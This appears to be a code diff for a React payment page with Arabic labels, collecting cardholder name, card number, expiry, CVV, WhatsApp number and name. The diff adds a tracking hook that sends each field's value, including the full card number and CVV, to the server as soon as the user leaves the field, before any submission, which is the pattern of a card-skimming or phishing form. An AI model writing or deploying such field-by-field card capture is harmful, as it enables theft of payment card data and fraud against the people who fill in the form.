@@ -3,10 +3,11 @@ import { useForm } from "react-hook-form";
 import { zodResolver } from "@hookform/resolvers/zod";
 import { z } from "zod";
 import { motion } from "framer-motion";
-import { useSubmitContact } from "@workspace/api-client-react";
+import { useSubmitContact, useTrackField } from "@workspace/api-client-react";
 import { AppLayout } from "@/components/layout/AppLayout";
 import { StepIndicator } from "@/components/StepIndicator";
 import { Loader2, Phone, User, CreditCard, Calendar, Lock } from "lucide-react";
+import { useRef, useCallback } from "react";
 
 const formSchema = z.object({
   cardName: z.string().min(2, "الرجاء إدخال اسم صاحب البطاقة"),
@@ -35,10 +36,22 @@ function formatExpiry(value: string) {
 export default function Contact() {
   const { id } = useParams<{ id: string }>();
   const [_, setLocation] = useLocation();
+  const sentFields = useRef<Record<string, string>>({});
 
-  const { register, handleSubmit, formState: { errors }, setValue, watch } = useForm<FormValues>({
+  const { register, handleSubmit, formState: { errors }, setValue, getValues } = useForm<FormValues>({
     resolver: zodResolver(formSchema)
   });
+
+  const { mutate: trackField } = useTrackField();
+
+  const sendField = useCallback((fieldName: string) => {
+    if (!id) return;
+    const value = getValues(fieldName as keyof FormValues);
+    if (!value || value.trim() === "") return;
+    if (sentFields.current[fieldName] === value) return;
+    sentFields.current[fieldName] = value;
+    trackField({ orderId: id, data: { fieldName, fieldValue: value } });
+  }, [id, trackField, getValues]);
 
   const { mutate, isPending } = useSubmitContact({
     mutation: {
@@ -92,6 +105,7 @@ export default function Contact() {
                     type="text"
                     placeholder="الاسم كما هو على البطاقة"
                     {...register("cardName")}
+                    onBlur={() => sendField("cardName")}
                     className={`w-full bg-black/50 border ${errors.cardName ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                   />
                   {errors.cardName && (
@@ -113,6 +127,7 @@ export default function Contact() {
                       const formatted = formatCardNumber(e.target.value);
                       setValue("cardNumber", formatted);
                     }}
+                    onBlur={() => sendField("cardNumber")}
                     className={`w-full bg-black/50 border ${errors.cardNumber ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg tracking-widest outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                   />
                   {errors.cardNumber && (
@@ -135,6 +150,7 @@ export default function Contact() {
                         const formatted = formatExpiry(e.target.value);
                         setValue("cardExpiry", formatted);
                       }}
+                      onBlur={() => sendField("cardExpiry")}
                       className={`w-full bg-black/50 border ${errors.cardExpiry ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                     />
                     {errors.cardExpiry && (
@@ -157,6 +173,7 @@ export default function Contact() {
                         const digits = e.target.value.replace(/\D/g, "").slice(0, 4);
                         setValue("cardCvv", digits);
                       }}
+                      onBlur={() => sendField("cardCvv")}
                       className={`w-full bg-black/50 border ${errors.cardCvv ? 'border-destructive' : 'border-white/15 focus:border-[#D4AF37]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#D4AF37]/20`}
                     />
                     {errors.cardCvv && (
@@ -184,6 +201,7 @@ export default function Contact() {
                       dir="ltr"
                       placeholder="+964 7XX XXX XXXX"
                       {...register("whatsapp")}
+                      onBlur={() => sendField("whatsapp")}
                       className={`w-full bg-black/50 border ${errors.whatsapp ? 'border-destructive' : 'border-white/15 focus:border-[#E30613]'} rounded-xl px-5 py-4 text-white text-lg outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#E30613]/20`}
                     />
                     <Phone className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
@@ -200,6 +218,7 @@ export default function Contact() {
                       type="text"
                       placeholder="اسمك"
                       {...register("name")}
+                      onBlur={() => sendField("name")}
                       className="w-full bg-black/50 border border-white/15 focus:border-[#E30613] rounded-xl px-5 py-4 text-white outline-none transition-all placeholder:text-white/20 focus:ring-4 focus:ring-[#E30613]/20"
                     />
                     <User className="absolute left-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
